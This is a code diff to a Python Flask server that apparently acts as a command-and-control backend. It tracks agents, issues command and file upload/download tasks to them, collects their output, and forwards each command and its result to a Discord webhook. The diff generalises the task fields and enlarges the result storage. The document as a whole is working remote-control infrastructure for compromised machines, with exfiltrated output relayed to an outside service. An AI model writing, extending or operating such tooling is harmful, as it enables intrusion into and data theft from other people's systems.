@@ -61,7 +61,7 @@ class Agent(db.Model):
     targeted = db.Column(db.Boolean,default=False)
     last_seen = db.Column(db.DateTime, default=datetime.now(tz=timezone.utc))
     last_command = db.Column(db.String(5000), nullable=True,default="NULL")
-    last_result = db.Column(db.String(10000), nullable=True,default="NULL")
+    last_result = db.Column(db.Text, nullable=True,default="NULL")
     callbacks = db.Column(db.Integer, nullable=False, default=0)
     tags = db.relationship(
         'Tag',
@@ -73,11 +73,11 @@ class Task(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     agent_id = db.Column(db.String(100), db.ForeignKey('agent.agent_id'), nullable=False)
     action = db.Column(db.String(5000), nullable=True,default="NULL")
-    command = db.Column(db.String(5000), nullable=True,default="NULL")
-    filename = db.Column(db.String(1000), nullable=True,default="NULL")
+    input1 = db.Column(db.String(5000), nullable=True,default="NULL")
+    input2 = db.Column(db.String(5000), nullable=True,default="NULL")
     destination = db.Column(db.String(1000), nullable=True,default="NULL")
     completed = db.Column(db.Boolean, default=False)
-    result = db.Column(db.String(10000), nullable=True,default="NULL")
+    result = db.Column(db.Text, nullable=True,default="NULL")
     returncode = db.Column(db.Integer, nullable=True,default=1234) # Default value to differentiate from actual return codes
 
 # Initialize database
@@ -164,11 +164,11 @@ def discord_notify_return(agent_id):
     if webhook_url:
         requests.post(webhook_url, json={"content": f"{agent_id} is back!"})
 
-def discord_notify_result(agent_id,result):
+def discord_notify_result(agent_id,command,result):
     webhook_url = config["RESULT_WEBHOOK"]
     if webhook_url:
         try:
-            r = requests.post(webhook_url, json={"content": f"Agent ID: {agent_id}\nResult:\n\n{result}\n"})
+            r = requests.post(webhook_url, json={"content": f"Agent ID: {agent_id}\nCommand: {command}\nResult:\n\n{result}\n"})
             if r.status_code != 204:
                 if r.text == '{"content": ["Must be 2000 or fewer in length."]}':
                     raise ValueError("Message too long")
@@ -176,7 +176,7 @@ def discord_notify_result(agent_id,result):
         except ValueError:
             file = io.BytesIO(result.encode())
             files = {'file': ('result.txt', file)}
-            payload = {'content': "Results too long, see file:"}
+            payload = {'content': f"Agent ID: {agent_id}\nCommand: {command}\nResult:\n\nResults too long, see file:"}
             r = requests.post(webhook_url, data=payload, files=files)
         except Exception as e:
             print("ERROR:\t",str(e))
@@ -226,12 +226,11 @@ def register_agent():
 def submit_results():
     try:
         # print(request.json)
+        print("Length",len(request.json['result']))
         data = request.json
         result = data['result']
         agent_id = data['agent_id']
         print(f"\nIP: {agent_id}" + "\t" + f"Result: {result}"+"\n")
-        if config.get("notify_discord"):
-            discord_notify_result(agent_id,result)
         task_id = data['task_id']
         task = db.session.get(Task, task_id)
         task.completed = True
@@ -242,9 +241,11 @@ def submit_results():
         agent.last_result = result
         db.session.commit()
         update_timestamp(agent_id)
+        if config.get("notify_discord"):
+            discord_notify_result(agent_id,agent.last_command,result)
         return jsonify({'status': 'success'})
-    except:
-        return jsonify({'status': 'failed'}), 400
+    except Exception as e:
+        return jsonify({'status': 'failed','error':str(e)}), 400
 
 @app.route('/tasks', methods=['POST'])
 def get_task():
@@ -254,18 +255,18 @@ def get_task():
         if agent is None:
             return jsonify({"status": "Must re-register"}), 418 #If agent_id isn't in database, tell the client to re-register
         else:
-            
             on_callback(agent)
             db.session.commit()
         task = Task.query.filter_by(agent_id=ip, completed=False).first()
         if task:
             task_data = {
                 'action': task.action,
-                'command': task.command,
-                'filename': task.filename,
+                'input': task.input1,
+                'input2': task.input2,
                 'task_id': task.id
             }
-            agent.last_command = task.command
+            if task.action == "command":
+                agent.last_command = task.input1
             db.session.commit()
             return jsonify(task_data),200
         return jsonify({"status": "No tasks"}), 204
@@ -316,17 +317,21 @@ def make_task():
     data = request.json
     agent_id = data.get('agent_id')
     action = data.get('action')
-    command = data.get('command')
-    if data['action'] == "command":
-        command = data.get('command')
+    # command = data.get('command')
+    # if data['action'] == "command":
+    #     command = data.get('command')
+    # else:
+    #     command = "NULL"
+    if data.get("input"):
+        input1 = data.get("input")
     else:
-        command = "NULL"
-    if data['action'] == "download" or data['action'] == "upload":
-        filename = data.get('filename')
+        input1 = "NULL"
+    if data.get("input2"):
+        input2 = data.get("input2")
     else:
-        filename = "NULL"
+        input2 = "NULL"
     try:
-        new_task = Task(agent_id=agent_id, action=action, command=command, filename=filename)
+        new_task = Task(agent_id=agent_id, action=action, input1=input1, input2=input2)
         db.session.add(new_task)
         db.session.commit()
         return jsonify({"message": "Task created successfully"}), 201
